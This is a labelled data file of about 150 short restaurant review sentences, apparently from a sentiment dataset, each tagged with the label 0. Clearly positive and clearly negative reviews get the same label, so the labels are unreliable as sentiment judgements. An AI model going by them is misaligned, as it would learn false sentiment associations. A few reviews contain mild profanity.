Wow... Loved this place.	0
Crust is not good.	0
Not tasty and the texture was just nasty.	0
Stopped by during the late May bank holiday off Rick Steve recommendation and loved it.	0
The selection on the menu was great and so were the prices.	0
Now I am getting angry and I want my damn pho.	0
Honeslty it didn't taste THAT fresh.)	0
The potatoes were like rubber and you could tell they had been made up ahead of time being kept under a warmer.	0
The fries were great too.	0
A great touch.	0
Service was very prompt.	0
Would not go back.	0
The cashier had no care what so ever on what I had to say it still ended up being wayyy overpriced.	0
"I tried the Cape Cod ravoli, chicken, with cranberry...mmmm!"	0
I was disgusted because I was pretty sure that was human hair.	0
I was shocked because no signs indicate cash only.	0
Highly recommended.	0
Waitress was a little slow in service.	0
"This place is not worth your time, let alone Vegas."	0
did not like at all.	0
The Burrittos Blah!	0
"The food, amazing."	0
Service is also cute.	0
I could care less... The interior is just beautiful.	0
So they performed.	0
That's right....the red velvet cake.....ohhh this stuff is so good.	0
They never brought a salad we asked for.	0
"This hole in the wall has great Mexican street tacos, and friendly staff."	0
"Took an hour to get our food only 4 tables in restaurant my food was Luke warm, Our sever was running around like he was totally overwhelmed."	0
The worst was the salmon sashimi.	0
"Also there are combos like a burger, fries, and beer for 23 which is a decent deal."	0
This was like the final blow!	0
I found this place by accident and I could not be happier.	0
"seems like a good quick place to grab a bite of some familiar pub food, but do yourself a favor and look elsewhere."	0
"Overall, I like this place a lot."	0
The only redeeming quality of the restaurant was that it was very inexpensive.	0
Ample portions and good prices.	0
"Poor service, the waiter made me feel like I was stupid every time he came to the table."	0
My first visit to Hiro was a delight!	0
Service sucks.	0
The shrimp tender and moist.	0
There is not a deal good enough that would drag me into that establishment again.	0
Hard to judge whether these sides were good because we were grossed out by the melted styrofoam and didn't want to eat it for fear of getting sick.	0
"On a positive note, our server was very attentive and provided great service."	0
"Frozen pucks of disgust, with some of the worst people behind the register."	0
The only thing I did like was the prime rib and dessert section.	0
It's too bad the food is so damn generic.	0
"The burger is good beef, cooked just right."	0
If you want a sandwich just go to any Firehouse!!!!!	0
"My side Greek salad with the Greek dressing was so tasty, and the pita and hummus was very refreshing."	0
We ordered the duck rare and it was pink and tender on the inside with a nice char on the outside.	0
He came running after us when he realized my husband had left his sunglasses on the table.	0
Their chow mein is so good!	0
"They have horrible attitudes towards customers, and talk down to each one when customers don't enjoy their food."	0
The portion was huge!	0
"Loved it...friendly servers, great food, wonderful and imaginative menu."	0
The Heart Attack Grill in downtown Vegas is an absolutely flat-lined excuse for a restaurant.	0
Not much seafood and like 5 strings of pasta at the bottom.	0
"The salad had just the right amount of sauce to not over power the scallop, which was perfectly cooked."	0
"The ripped banana was not only ripped, but petrified and tasteless."	0
At least think to refill my water before I struggle to wave you over for 10 minutes.	0
This place receives stars for their APPETIZERS!!!	0
The cocktails are all handmade and delicious.	0
We'd definitely go back here again.	0
We are so glad we found this place.	0
"Great food and service, huge portions and they give a military discount."	0
Always a great time at Dos Gringos!	0
Update.....went back for a second time and it was still just as amazing	0
We got the food and apparently they have never heard of salt and the batter on the fish was chewy.	0
A great way to finish a great.	0
"The deal included 5 tastings and 2 drinks, and Jeff went above and beyond what we expected."	0
"Really, Really good rice, all the time."	0
The service was meh.	0
"It took over 30 min to get their milkshake, which was nothing more than chocolate milk."	0
"I guess I should have known that this place would suck, because it is inside of the Excalibur, but I didn't use my common sense."	0
The scallop dish is quite appalling for value as well.	0
2 times - Very Bad Customer Service !	0
The sweet potato fries were very good and seasoned well.	0
Today is the second time I've been to their lunch buffet and it was pretty good.	0
There is so much good food in Vegas that I feel cheated for wasting an eating opportunity by going to Rice and Company.	0
Coming here is like experiencing an underwhelming relationship where both parties can't wait for the other person to ask to break up.	0
walked in and the place smelled like an old grease trap and only 2 others there eating.	0
The turkey and roast beef were bland.	0
This place has it!	0
The pan cakes everyone are raving about taste like a sugary disaster tailored to the palate of a six year old.	0
I love the Pho and the spring rolls oh so yummy you have to try.	0
The poor batter to meat ratio made the chicken tenders very unsatisfying.	0
All I have to say is the food was amazing!!!	0
Omelets are to die for!	0
Everything was fresh and delicious!	0
"In summary, this was a largely disappointing dining experience."	0
"It's like a really sexy party in your mouth, where you're outrageously flirting with the hottest person at the party."	0
"Never been to Hard Rock Casino before, WILL NEVER EVER STEP FORWARD IN IT AGAIN!"	0
Best breakfast buffet!!!	0
say bye bye to your tip lady!	0
We'll never go again.	0
Will be back again!	0
Food arrived quickly!	0
It was not good.	0
"On the up side, their cafe serves really good food."	0
"Our server was fantastic and when he found out the wife loves roasted garlic and bone marrow, he added extra to our meal and another marrow to go!"	0
"The only good thing was our waiter, he was very helpful and kept the bloddy mary's coming."	0
"Best Buffet in town, for the price you cannot beat it."	0
"I LOVED their mussels cooked in this wine reduction, the duck was tender, and their potato dishes were delicious."	0
This is one of the better buffets that I have been to.	0
So we went to Tigerlilly and had a fantastic afternoon!	0
"The food was delicious, our bartender was attentive and personable AND we got a great deal!"	0
The ambience is wonderful and there is music playing.	0
Will go back next trip out.	0
Sooooo good!!	0
"REAL sushi lovers, let's be honest - Yama is not that good."	0
"At least 40min passed in between us ordering and the food arriving, and it wasn't that busy."	0
This is a really fantastic Thai restaurant which is definitely worth a visit.	0
"Nice, spicy and tender."	0
Good prices.	0
Check it out.	0
It was pretty gross!	0
I've had better atmosphere.	0
Kind of hard to mess up a steak but they did.	0
"Although I very much liked the look and sound of this place, the actual experience was a bit disappointing."	0
I just don't know how this place managed to served the blandest food I have ever eaten when they are preparing Indian cuisine.	0
"Worst service to boot, but that is the least of their worries."	0
Service was fine and the waitress was friendly.	0
"The guys all had steaks, and our steak loving son who has had steak at the best and worst places said it was the best steak he's ever eaten."	0
"We thought you'd have to venture further away to get good sushi, but this place really hit the spot that night."	0
"Host staff were, for lack of a better word, BITCHES!"	0
Bland... Not a liking this place for a number of reasons and I don't want to waste time on bad reviewing.. I'll leave it at that...	0
"Phenomenal food, service and ambiance."	0
I wouldn't return.	0
"Definitely worth venturing off the strip for the pork belly, will return next time I'm in Vegas."	0
This place is way too overpriced for mediocre food.	0
Penne vodka excellent!	0
"They have a good selection of food including a massive meatloaf sandwich, a crispy chicken wrap, a delish tuna melt and some tasty burgers."	0
The management is rude.	0
"Delicious NYC bagels, good selections of cream cheese, real Lox with capers even."	0
"Great Subway, in fact it's so good when you come here every other Subway will not meet your expectations."	0
I had a seriously solid breakfast here.	0
This is one of the best bars with food in Vegas.	0
"He was extremely rude and really, there are so many other restaurants I would love to dine at during a weekend in Vegas."	0
My drink was never empty and he made some really great menu suggestions.	0
Don't do it!!!!	0
The waiter wasn't helpful or friendly and rarely checked on us.	0
My husband and I ate lunch here and were very disappointed with the food and service.	0
And the red curry had so much bamboo shoots and wasn't very tasty to me.	0
Nice blanket of moz over top but i feel like this was done to cover up the subpar food.	0
The bathrooms are clean and the place itself is well decorated.	0
"The menu is always changing, food quality is going down & service is extremely slow."	0
"The service was a little slow , considering that were served by 3 people servers so the food was coming in a slow pace."	0
I give it 2 thumbs down	0
We watched our waiter pay a lot more attention to other tables and ignore us.	0
